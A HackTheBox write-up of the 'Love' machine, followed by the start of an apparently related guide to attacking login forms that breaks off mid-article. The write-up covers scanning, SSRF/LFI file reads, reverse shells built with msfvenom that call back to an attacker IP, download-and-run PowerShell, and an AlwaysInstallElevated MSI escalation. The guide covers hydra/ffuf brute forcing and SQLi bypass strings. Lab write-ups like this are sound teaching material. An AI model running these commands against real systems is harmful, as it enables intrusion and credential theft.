2024-02-21T21:49:08-08:00 | smb2-time: | date: 2024-02-22T05:49:09 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: 2h22m14s, deviation: 4h00m02s, median: 22m12s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR PORT STATE SERVICE 80/tcp open http |_http-trace: TRACE is enabled |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server&#39;s resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_ http://ha.ckers.org/slowloris/ 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server&#39;s resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_ http://ha.ckers.org/slowloris/ |_http-trace: TRACE is enabled 445/tcp open microsoft-ds 3306/tcp open mysql 5000/tcp open upnp 5040/tcp open unknown 5985/tcp open wsman 5986/tcp open wsmans 7680/tcp open pando-pub 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 9/udp open|filtered tcpwrapped 80/udp open|filtered http 123/udp open|filtered ntp 137/udp open|filtered netbios-ns 138/udp open|filtered tcpwrapped 500/udp open|filtered isakmp 1812/udp open|filtered radius 1900/udp open|filtered upnp 3703/udp open|filtered tcpwrapped 4500/udp open|filtered tcpwrapped 5353/udp open|filtered zeroconf 5632/udp open|filtered pcanywherestat Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the port 443 part of the nmap script scan, I added love.htb and staging.love.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=love.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts echo &#34;$RADDR staging.$DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from that. Now I&rsquo;ll check for subdomains of love.htb, I&rsquo;ll do this as if it were a vhost scan by fuzzing the host header:
I&rsquo;ve found this to be a faster method for subdomain enumeration.
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v The scan found the expected result, staging.love.htb. To be thorough, I should also do a subdomain scan on staging.love.htb:
No result there either. I&rsquo;ll move on to directory enumeration on http://love.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v Directory enumeration against http://love.htb/ gave the following:
Now I&rsquo;ll check the subdomain http://staging.love.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://staging.$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-staging -of json -e php,asp,js,html -timeout 4 -v There was also an HTTPS version of the site on port 443, https://staging.love.htb, so I&rsquo;ll also do directory enumeration on that:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; gobuster dir -w $WLIST -u https://staging.$DOMAIN -k \\ --random-agent -t 40 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-staging.$DOMAIN.txt&#34; \\ --no-error Same results as before.
The nmap scans showed another few ports responding to HTTP: 5000, 5985, and 47001. It&rsquo;s unlikely, but I may as well check them too.
ffuf -w $WLIST:FUZZ -u http://$RADDR:5000/FUZZ -t 80 -c -o ffuf-directories-port5000 -of json -e php -timeout 4 -v -fw 22 Well that&rsquo;s more than a coincidence. The exact same pages as staging.love.htb, but I can&rsquo;t access any index page for it.
ffuf -w $WLIST:FUZZ -u http://staging.$DOMAIN:5985/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-port5985 -of json -e php,asp,js,html -timeout 4 -v -fs 308 No results at all from port 5985. Lastly, 47001:
ffuf -w $WLIST:FUZZ -u http://staging.$DOMAIN:47001/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-port47001 -of json -e php,asp,js,html -timeout 4 -v Again, no results.
Exploring the Website From directory enumeration, I discovered an admin endpoint that redirects to http://love.htb/admin/index.php. There is a simple login form that POSTs to login.php:
Just to try the obvious, I&rsquo;ll go for some simple credential-guessing using hydra:
USERS=/usr/share/seclists/Usernames/top-usernames-shortlist.txt PASSWORDS=/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt hydra -L $USERS -P $PASSWORDS -I love.htb http-post-form &#34;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;login=:H=Cookie: PHPSESSID=fabeh7tcq673g4dgdvpm778r63:F=Sign in to start your session No success with that. I saw from the nmap scans that MySQL is running - how about an SQLi auth bypass?
WLIST=/usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt ffuf -w $WLIST:FUZZ -u http://love.htb/admin/login.php -r -X POST -t 40 -c \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#34;PHPSESSID=tgfvpmpk5cf54rkjd27geeo84d&#34; \\ -d &#34;username=FUZZ&amp;password=password123&amp;login=&#34; \\ -fr &#39;Sign in to start your session&#39; Nope, nothing. But what about the subdomain? It appears to be some kind of malware-scanning utility, currently in beta. Like some low-key version of virustotal:
Clicking Demo in the header links to /beta.php. This might be usable as a foothold:
FOOTHOLD PHP Reverse Shell I&rsquo;ll start up a listener for a reverse shell, and a webserver for uploading files to this beta.php form. With any luck, the server is doing some kind of &ldquo;dynamic analysis&rdquo; and running the scripts in a totally unconfined way (which would be a little nutty, to be honest):
sudo ufw allow from $RADDR to any port 4444,8000,9999 proto tcp cd ~/Box_Notes/Love/exploit/ vim php-reverse.shell.php # Edit the IP and port python3 -m http.server 8000 &amp; rlwrap socat -d TCP-LISTEN:4444 STDOUT I&rsquo;m using the cross-platform PHP reverse shell from this repo.
Unfortunately, uploading the reverse shell had no effect. Part of the code did get displayed onto the page though:
LFI for MySQL creds Since I&rsquo;m able to load an external resource through this /beta.php page, maybe I&rsquo;m also able to load an internal resource?
The addresses I&rsquo;m entering will be interpreted from the perspective of the server, so if I&rsquo;m lucky it&rsquo;ll already have its DNS or hosts file configured to resolve love.htb and staging.love.htb. However, that&rsquo;s kinda unlikely. If it was confugred like that, it would&rsquo;ve only been for the developer&rsquo;s convenience&hellip;
I two pages that would defnitely exist if the above is true: http://love.htb/admin/ and http://staging.love.htb/index.php - no result from either.
Next, I&rsquo;ll try just the localhost: http://127.0.0.1/admin/
Ok, that&rsquo;s a little interesting! It loaded the php for the http://love.htb/admin/ page from within /beta.php.
Maybe I can grab a file off the local system instead? I&rsquo;ll try file:///C:/Windows/System32/drivers/etc/hosts:
Success! This is great, but only because I know exactly the filepath to check&hellip;
Back when I did directory enumeration on love.htb, I found the /tcpdf directory, and I remember that it had a few files in there that caused some error / warning when I opened them. Maybe there&rsquo;s a clue in there?
I asked ChatGPT about the typical xampp directory structure:
C:\\xampp ├── apache │ ├── bin │ ├── conf │ ├── htdocs │ └── ... ├── mysql │ ├── bin │ ├── data │ ├── scripts │ └── ... ├── php │ ├── ... ├── ... └── xampp ├── ... The file file:///C:/xampp/apache/conf/httpd.conf might exist. A quick test shows that it does exist, and can indeed be read from this LFI, but it doesn&rsquo;t really provide any extra data.
Next, I was wondering where each domain&rsquo;s files were located within xampp. I&rsquo;ll check the file that usually defines this, file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf:
Great, so there should be three domains:
C:/xampp/htdocs/passwordmanager This is www.love.htb C:/xampp/htdocs/omrs This is love.htb C:/xampp/htdocs/FFS This is staging.love.htb aka Free File Scanner I&rsquo;m hoping to find some database credentials. There probably isn&rsquo;t some kind of .env file sitting around, but I might be able to find some credentials by checking the source code of that login page I encountered earlier. According to the above httpd-vhosts.conf file shown above, I can probably find the login endpoint code at C:/xampp/htdocs/omrs/admin/login.php:
This only shows a portion of the file. To see the whole thing, check the view-source: of that page (Ctrl+U in Firefox). This displays the source code from that login.php file:
&lt;?php session_start(); include &#39;includes/conn.php&#39;; if(isset($_POST[&#39;login&#39;])){ $username = $_POST[&#39;username&#39;]; $password = $_POST[&#39;password&#39;]; $sql = &#34;SELECT * FROM admin WHERE username = &#39;$username&#39;&#34;; $query = $conn-&gt;query($sql); if($query-&gt;num_rows &lt; 1){ $_SESSION[&#39;error&#39;] = &#39;Cannot find account with the username&#39;; } else{ $row = $query-&gt;fetch_assoc(); if(password_verify($password, $row[&#39;password&#39;])){ $_SESSION[&#39;admin&#39;] = $row[&#39;id&#39;]; } else{ $_SESSION[&#39;error&#39;] = &#39;Incorrect password&#39;; } } } else{ $_SESSION[&#39;error&#39;] = &#39;Input admin credentials first&#39;; } header(&#39;location: index.php&#39;); ?&gt; Well, that explains some of the behaviour behind that login form.
Actually, taking a look at this source code makes me wonder if it might have worked to simply insert a new record from within the WHERE clause of the username select statement &#x1f914;
The important line is the include 'includes/conn.php'; near the top. This must be where the database connection info is stored. Requesting file://C:/xampp/htdocs/omrs/includes/conn.php confirms this. &#x1f600; Opening up view-source again reveals some plaintext credentials!
The database credential being used by love.htb is phoebe : HTB#9826^(_ and it&rsquo;s accessing the database votesystem on localhost.
Unfortunately, attempting to connect to the database directly will not work:
I&rsquo;m certain I&rsquo;ll need these credentials later. After checking one more thing, I&rsquo;ll come back to these credentials and see if there was any credential re-use &#x1f6a9;
SSRF for HTTP ports Earlier, when I was investigating LFIs, I looked into loading resources from staging.love.htb. However, I was relying on the server having an entry in its hosts file to resolve the subdomain from its own perspective. This got me thinking: what port is staging.love.htb listening on? Does it even use a specific port? Can I load a resource directly from that subdomain using /beta.php?
Well, when doing directory enumeration, I found that staging.love.htb and 10.10.10.239:5000 both showed the same few resources (resulting in HTTP 403 Unauthorized). Navigating to port 5000 the normal way shows an Unauthorized message:
Ok, but could I load that page by using /beta.php? Does localhost have permission to access that resource..?
As it turns out, localhost does have authorization to access port 5000! There&rsquo;s another credential sitting there in plain sight. admin : @LoveIsInTheAir!!!!
Also, very kind of the devs to even indicate what the credential is for &#x1f609;
So, that&rsquo;s two credentials to check out now. I&rsquo;ll try the admin user of the Voting System first, at http://love.htb/admin/:
Bingo! We now have access to the admin dashboard. I&rsquo;ll explore this in a minute &#x1f6a9; First, I want to go check if the other credential I found was re-used.
USER FLAG Evil-winrm I&rsquo;ll quickly check with evil-winrm if there was any credential re-use:
Nice! The credentials I got from the database connection in /includes/conn.php were re-used. I now have a shell as phoebe &#x1f389;
Navigating to phoebe&rsquo;s desktop, it looks like the user flag is available. Simply type it out for some points!
ROOT FLAG Voting system The Voters section of the admin dashboard allows me to register new voters in the system. I suspect this is for http://love.htb/index.php (which the admin credentials did not grand access to). I&rsquo;ll register a new user and try logging in as them. Registering a voter creates a new Voter ID and allows you to set a password. The system created Vhb6u2Irg9pSMxC : password123 for me.
This works perfectly, granting access to the non-admin part oflove.htb:
In addition to adding voters, from the Admin dashboard you&rsquo;re able to define new positions, candidates, and elections. These changes are all reflected to the non-admin part of the site:
Enumeration (with credential) I&rsquo;ll check enum4linux first, since it usually turns up some interesting results when provided with a credential:
enum4linux -u &#39;phoebe&#39; -p &#39;HTB#9826^(_&#39; -a $RADDR It found some users (Administrator, WDAGUtilityAccount, and Phoebe) and groups (Administrators, Users, Power Users) on the target, plus some other insignificant things. There were no significant results form smbmap.
Next, I want to try running winpeas. I&rsquo;ll have to serve the executable to the target. winpeas is part of my (very incomplete) Windows toolbox:
# On attacker machine: sudo ufw allow from $RADDR to any port 8000 proto tcp python3 -m http.server 8000 # On target, via evil-winrm: (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.9:8000/winPEASany.exe&#39;, &#39;C:\\Users\\Phoebe\\Downloads\\winpeas.exe&#39;) .\\winpeas.exe WinPEAS It looks like a couple directories are whitelisted from Windows Defender:
Also, AlwaysInstallElevated is enabled - I might be able to install something with administrator permissions:
Note that this could be checked manually by doing a couple registry queries: (HKCU: HKey Current User, KHLM: HKey Local Machine)
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\ /v AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\ /v AlwaysInstallElevated winpeas also identified some conditions for where phoebe might be able to run a .msi file:
Note that the above also corresponds to a location in the AV whitelist.
Malicious MSI &#x1f6ab; The following section uses the right technique, but the wrong setup.
For some reason, this was all thwarted because my foothold was through evil-winrm. I&rsquo;m still not sure why that was an issue.
Please skip ahead to Getting a new foothold if you&rsquo;re short on time.
The results of winpeas suggest that I should be able to craft a malicious .msi file, and install it from the C:\\Administration directory. It&rsquo;s execution from within that directory should be whitelisted by the antivirus. Really, it&rsquo;s all best-case-scenario for an attacker.
This technique can be found in the TryHackMe room Windows PrivEsc. Jump straight to Task 8 to see try this technique on a vulnerable machine. I watched this video by Hackersploit to learn more about this vulnerability, which referenced the THM room linked above.
Ideally, I can just open a reverse shell (as Administrator) using this technique, so I&rsquo;ll try that first. On my attacker machine, I&rsquo;ll create the malicious .msi using msfvenom then serve the file from a python webserver:
# Create the msi and serve it msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f msi -o reverse.msi python3 -m http.server 8000 # In another tab, make a reverse shell listener sudo ufw allow from $RADDR to any port 4444 proto tcp rlwrap socat -d TCP-LISTEN:4444 STDOUT Then, on the target machine via evil-winrm, I&rsquo;ll download the file and run the installer:
# Download the msi (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.9:8000/reverse.msi&#39;, &#39;C:\\Administration\\reverse.msi&#39;) # &#34;Install&#34; it msiexec /quiet /qn /i C:\\Administration\\reverse.msi Hmm&hellip; No luck! Very odd, considering that that everything looked perfect for this exploit.
Troubleshooting: TCP Reverse shell as foothold I did some reading on forum.hackthebox.com to see if I was doing anything obviously wrong. It looks like there was another user having exactly the same difficulties as me, and found that it was due to using evil-winrm to connect instead of a regular reverse shell.
It seems like most people got RCE by using a file upload vulnerability from the Admin dashboard. I didn&rsquo;t bother investigating any RCE there because, by that point, I already had a winrm shell as phoebe!
On the attacker box, use msfvenom to create a reverse shell, serve it, and start up the listener:
# Generate a reverse shell and serve it msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f exe -o revshell.exe python3 -m http.server 8000 # In another tab, start a listener rlwrap socat -d TCP4-LISTEN:4444,fork STDOUT Then on the target box (using the evil-winrm shell), download the reverse shell payload and execute it:
# Download it (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.9:8000/revshell.exe&#39;, &#39;C:\\Users\\Phoebe\\Downloads\\revshell.exe&#39;) # Execute it .\\revshell.exe Great, I have a reverse shell formed in a regular way now&hellip; But my malicious msi attack is still not working?!
When I read even further into the forums.hackthebox.com discussion of this box, another user suggested that they weren&rsquo;t able to perform the malicious MSI attack even when using a regular reverse shell that was spawned from Evil-WinRM &#x1f625;
Maybe I need to find a way to do this without even using evil-winrm as the initial foothold &#x1f914;
Getting a new foothold If I&rsquo;m going to avoid evil-winrm entirely, I need to find a new foothold. The Admin dashboard seems like the most obvious choice. I already know there is a profile-picture upload on that site. There might also be a way to upload a reverse shell through the Candidate image.
Once again, I&rsquo;ll start up a listener:
rlwrap socat -d TCP4-LISTEN:4444,fork STDOUT While going to define a new Candidate, I realized that the Voter entity also has a profile picture upload. Using the exact same PHP reverse shell as earlier (in the PHP Reverse Shell section, i.e. the cross-platform reverse shell from this repo), I defined a new voter:
As soon as I hit Save, the page underneath attempted to render, and tripped the reverse shell:
&#x1f389; That was easier than I thought it would be! Let&rsquo;s proceed with the Malicious MSI attack again.
Malicious MSI Again I&rsquo;ve already generated reverse.msi containing a payload to form a reverse shell back to a listener already running on port 4445. All I need to do is use my new foothold to download the .msi and run it:
# Switch to powershell powershell # Download it (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.9:8000/reverse.msi&#39;, &#39;C:\\Administration\\reverse.msi&#39;) # &#34;Install&#34; it msiexec /quiet /qn /i C:\\Administration\\reverse.msi Worked like a charm!
From there, just type out the flag for some points&#x1f34d;
LESSONS LEARNED Attacker Avoid Evil-WinRM. I&rsquo;ve had a lot of trouble with it in the past. On this box, I wasted hours trying to troubleshoot why my very clear and simple Malicious MSI attack was not working. In the end, it was simply something to do with using Evil-WinRM as the foothold &#x1f937;&zwj;&#x2642;&#xfe0f;. When you have Two things to try, do the shorter one first. I thought my usage of the SSRF to obtain database credentials was fantastic, but really I should have done the two things in the opposite order. It would have been very fast to look into port 5000 before I started enumerating the xampp installation via an SSRF (which took quite a bit of guessing, and thus time). MSFVenom is incredible! Use it early and often. Anything else is just to challenge yourself. At the end of the day, I&rsquo;d rather know all the cool features of msfvenom than to be able to manually replicate even a fraction of its functionality. It can even help obfuscate your payloads! Defender SSRF could have been avoided. Doing malware scanning is very difficult to do safely. In my opinion, the client should have been able to upload a file into only a tightly sandboxed environment, where it cannot access any local files. The server should have only been able to read the results of a malware scan from a specific directory, and nowhere else.
Sanitize image uploads. Check extensions; validate MIME types; check file sizes; never every blindly include() an image in PHP. By now we all should have seen enough Imagick exploits to make our skin crawl. Be super careful with any user-uploaded content!
Least privilege should always be followed. On this box, it&rsquo;s clear that the webserver and the &ldquo;power user&rdquo; Phoebe should have been separate accounts. Better yet, put the webserver and database in separate containers that communicate as little as possible with each other.
AlwaysInstallElevated should AlwaysBeDisabled, in my opinion. The only reason I can think of to turn it on, even temporarily, is laziness of an administrator - which is definitely not a sufficient reason.
`,url:"https://4wayhandshake.github.io/walkthrough/love/"},"https://4wayhandshake.github.io/strategy/login-forms/":{title:"Login Forms",tags:["Default Credentials","Authentication Bypass","SQLi","Hydra","Ffuf"],categories:["Strategy","CTF","Web"],content:`INTRODUCTION The moment you encounter a login form can be magical: there are so many possibilities at your fingertips&hellip; did they leave some default credentials on the system? Is there an SSRF? Maybe there&rsquo;s a way to bypass authentication completely?
Having so many options can be both a blessing and a curse. It can be a little daunting to have to keep so many techniques in mind, and to keep your eyes open for evidence of the form&rsquo;s vulnerability to each. In an effort to keep your efforts focused and heading in the right direction, I&rsquo;m writing this strategy of my favorite techniques to try on login forms.
Disclaimer The procedure outlined below is not even close to comprehensive. There are countless ways to attack a login form. This strategy is simply a summary of my &ldquo;greatest hits&rdquo; when dealing with machines on platforms like HackTheBox. Modern day login forms typically rely on some kind of federated login or single-sign-on mechanism, which is definitely outside the scope of this document.
RECON The best place to start is by learning about the login form you&rsquo;re facing. Determine what type of authentication is taking place (ex. Is it using basic http auth? Does it POST a form to a login endpoint? Do you have a session token before logging in?).
Performing a single login attempt manually and proxying it through Burp is a great way to answer these questions quickly. Here&rsquo;s an example of an HTTP POST form, like on you might see on an Apache PHP server.
POST /admin/login.php HTTP/1.1 Host: love.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 42 Origin: http://love.htb DNT: 1 Connection: close Referer: http://love.htb/admin/ Cookie: PHPSESSID=fabeh7tcq673g4dgdvpm778r63 Upgrade-Insecure-Requests: 1 Sec-GPC: 1 username=admin&amp;password=password123&amp;login= Check the header and footer of the page. Does it display the name of the software or framework? a version number? With any luck, the target is using some open source system: in such a case, finding default credentials often reduces to a simple search on Github.
If you&rsquo;re on Kali or have Seclists&rsquo; repo on your machine, it&rsquo;s also worth checking known-defaults wordlist, such as: /usr/share/seclists/Passwords/Default-Credentials
CREDENTIAL GUESSING Guessing credentials should be your very first stop. It&rsquo;s surprisingly common to leave easy / guessable credentials on the system, and this attack is incredibly easy to try.
If your recon turned up some default credentials to try, check those first. Otherwise, you may start by interacting with the form manually, typing some credentials and hitting Enter. This will work on some very easy boxes.
However, I like to take a more systematic / automated approach. Both hydra and ffuf are excellent options.
wfuzz is also good, but I don&rsquo;t often use it personally.
hydra has many different modules for credential guessing. Outlined below are only http-get and http(s)-post-form. To see the whole list, check the help text:
hydra -h | grep &#34;Supported services&#34; Then, to get more information on how to use a particular module, just pass the -U argument. For example, learn how to use snmp:
hydra -U snmp x-www-form-urlencoded For this section, I&rsquo;ll use a login form on the HTB machine Love as an example. From recon, I noted the following observations:
Observations from recon:
The form is located at http://love.htb/admin/index.php. As shown above, in the recon section, this form issues a POST request to /admin/login.php. The cookie PHPSESSID is included in the request. Credentials are sent in the fields username and password. The empty &ldquo;submit&rdquo; field is called login . Incorrect attempts redirect back to the login form, which has the text Sign in to start your session.
Hydra Using the above information, we can point hydra at the form, attacking it in a multithreaded credential-guessing attack:
USERS=/usr/share/seclists/Usernames/top-usernames-shortlist.txt PASSWORDS=/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt hydra -L $USERS -P $PASSWORDS -I love.htb http-post-form &#34;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;login=:H=Cookie: PHPSESSID=fabeh7tcq673g4dgdvpm778r63:F=Sign in to start your session&#34; Any attempts that produce a response that doesn&rsquo;t include the F= text are considered successful and will be displayed in the console.
Provide the cookie as a portion of the header (:H=Cookie: key1=val1; key2=val2) the filter string (:F=text you see if authentication failed) must be after the cookie This is how we&rsquo;d adjust hydra for a hypothetical HTTPS form that is otherwise identical:
hydra -L $USERS -P $PASSWORDS -I -S love.htb https-post-form &#34;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;login=:H=Cookie: PHPSESSID=fabeh7tcq673g4dgdvpm778r63:F=Sign in to start your session&#34; Use method https-post-form, not http-post-form, along with the -S option Ffuf Let&rsquo;s do the same thing with ffuf. Personally, I prefer ffuf for this task - it is clearer about what options to use:
ffuf -u http://love.htb/admin/login.php -r -t 16 -c -v \\ -w &#34;/usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER&#34; \\ -w &#34;/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt:PASS&#34; \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#34;PHPSESSID=fabeh7tcq673g4dgdvpm778r63&#34; \\ -d &#39;username=USER&amp;password=PASS&amp;login=&#39; \\ -fr &#39;Sign in to start your session&#39; Oddly, I haven&rsquo;t ever been able to get this to work if I use bash variables as the wordlist paths &#x1f937;&zwj;&#x2642;&#xfe0f;
You can also get ffuf to load an http request that was saved using a tool like Burp - very similar to the same feature that&rsquo;s in sqlmap. It saves writing out a bunch of args and flags for ffuf.
(I removed the regex filter for illustrative purposes. It would be smart to use the -fr option in actual practice.)
Here&rsquo;s the same thing, but using a hypothetical HTTPS form. Note the -k flag and the change to the -u parameter:
ffuf -u https://love.htb/admin/login.php -k -r -t 16 -c -v \\ -w &#34;/usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER&#34; \\ -w &#34;/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt:PASS&#34; \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#34;PHPSESSID=fabeh7tcq673g4dgdvpm778r63&#34; \\ -d &#39;username=USER&amp;password=PASS&amp;login=&#39; \\ -fr &#39;Sign in to start your session&#39; There are many tools that will do this type of thing. I really appreciate the versatility of ffuf though. Ffuf never tries to override anything you tell it to do, which makes everything a little more transparent.
Basic HTTP Auth It&rsquo;s rare these days, but sometimes you still encounter basic http authentication. You can identify this by checking the request and response headers:
The request will have a header like this: Authorization: Basic ZWMyLXVzZXI6MTIzNDU2MQ== Where the value is base64(username:password) The response to initial (unsuccessful) attempts to log in will have a WWW-Authenticate header set. Probably showing something like WWW-Authenticate: Basic realm=&quot;Access denied&quot;. Hydra Thankfully, Hydra makes it really easy to combine wordlists into the base64-encoded username:password format shown above. The only trick is to provide the proper args to attempt to use basic http auth:
USERS=/usr/share/seclists/Usernames/top-usernames-shortlist.txt PASSWDS=/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt hydra -L $USERS -P $PASSWDS 83.136.254.223 -s 41958 http-get &#34;/&#34; Ffuf Getting ffuf to do a dictionary attack for basic http auth is a little more involved. Fortunately though, ffuf is perfectly happy to use STDIN as a wordlist. Instead of providing a wordlist filepath, just use -w -
&#x26a0;&#xfe0f; To do this, we need to either choose to use a lot of RAM, or a lot of disk.
If you prefer to use more disk, then generate the wordlist first. The example below is the &ldquo;use a lot of RAM&rdquo; way.
# Get our wordlists as shell variables USERS=/usr/share/seclists/Usernames/top-usernames-shortlist.txt PASSWDS=/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt # Pipe a script&#39;s stdout into ffuf as a wordlist. while IFS= read -r P; do while IFS= read -r U; do printf &#34;%s:%s&#34; $U $P | base64; done &lt; $USERS; done &lt; $PASSWDS | \\ ffuf -w -:B64 -u http://83.136.254.223:41958 -H &#34;Authorization: Basic B64&#34; -fc 401 -v -s | base64 -d admin:admin While you&rsquo;re testing the args, I recommend using the following:
-x http://127.0.0.1:8080 : proxy your tests through Burp or ZAP. Omit the -fc and -s arguments, and don&rsquo;t pipe the results to base64 -d. AUTHENTICATION BYPASS SQLi Bypass When the handler of a login form fails to perform proper input sanitization and validation, it might be susceptible to some really easy SQL injection. If that&rsquo;s the case, you might be able to bypass the login form altogether. This works by passing specially-crafted SQL escapes into the username or password fields, tricking the logic of the backend code into thinking the credentials were valid. Here&rsquo;s a textbook example:
admin&#39; or &#39;1&#39;=&#39;1&#39;-- (Note there is a space after the SQL comment --). Using the above as a username might let you in if the username parameter is passed to the code within singlequotes and the authentication logic is handled within SQL itself.
It works like this: The password check gets bypassed by the '1'='1' evaluating to True and the -- comment character truncates the rest of the logic. As a result, the whole SQL statement evaluates to True, possibly letting you in.
Since there are so many SQL auth bypass strings to attempt, I find it very useful to automate it with ffuf:
WLIST=/usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt ffuf -w $WLIST:FUZZ -u http://love.htb/admin/login.php -r -X POST -t 40 -c \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#34;PHPSESSID=fabeh7tcq673g4dgdvpm778r63&#34; \\ -d &#34;username=FUZZ&amp;password=password123&amp;login=&#34; \\ -fr &#39;Sign in to start your session&#39; For an example, please see the section of my walkthrough of Toolbox where I use this exact technique to find these auth bypasses:
Note that this scan only took three seconds. It&rsquo;s definitely worth checking.
&#x1f6a8; If an SQLi bypass works, there is a high likelihood that SQL injection can be be further leveraged to gain RCE. Please see SQLMap for more details. Usage of SQLMap is such a broad topic that it could easily be a whole article by itself.
Session Hijacking Do your target use session cookies, and you&rsquo;ve already obtained another (valid) session token? If so, just plonk it right into your browser&rsquo;s cookies and navigate to the restricted endpoint (ex. the page where you would have been redirected if you had logged in legitimately). This is an excellent extension to a successful XSS attack.
If this works, a good thing to check right away is whether you can perform a password-reset without reauthenticating - that would lead to account takeover!
Forging a Cookie As mentioned above, sometimes all you need to &ldquo;prove&rdquo; you are already authenticated is to present some kind of token or cookie. Sometimes, a website will fail to verify the cookie server-side. I&rsquo;ve seen this before with the following authentication mechanism:
The client provides credentials. Their credentials get wrapped together into a cookie and stored in the browser. Let&rsquo;s call this cookie &ldquo;CREDS&rdquo;.
&#x261d;&#xfe0f; It doesn&rsquo;t matter if it was the client or the server that bundled the credentials into the cookie.
The server reads the credentials and determines if they are valid. If they are valid, the server takes CREDS and cryptographically signs it, creating CREDS_SIGNED, then hands that signed cookie back to the user.
The user now presents both cookies for any request, proving they are who they say they are, that the server validated the authentication.
So, what could go wrong? A sloppy developer might botch step (2):
